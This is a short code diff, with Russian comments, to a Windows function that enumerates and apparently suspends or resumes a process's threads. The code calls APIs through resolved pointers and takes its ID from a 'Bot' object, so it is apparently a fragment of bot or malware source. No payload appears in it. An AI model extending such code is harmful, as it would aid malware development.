@@ -508,7 +508,7 @@ bool StartStopProcessThreads(bool Stop)
 {
 	// Получам симок работающих процессов
 	DWORD PID    = Bot->PID();
-	DWORD Thread = GetCurrentThreadId();
+	DWORD Thread = (DWORD)pGetCurrentThreadId();
 
 	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 	if(Snap == INVALID_HANDLE_VALUE) return false;
@@ -516,7 +516,7 @@ bool StartStopProcessThreads(bool Stop)
 	THREADENTRY32 te;
 	te.dwSize = sizeof(THREADENTRY32 );
 
-	if(pThread32First(Snap, &te))
+	if (pThread32First(Snap, &te))
     {
 		do
 		{
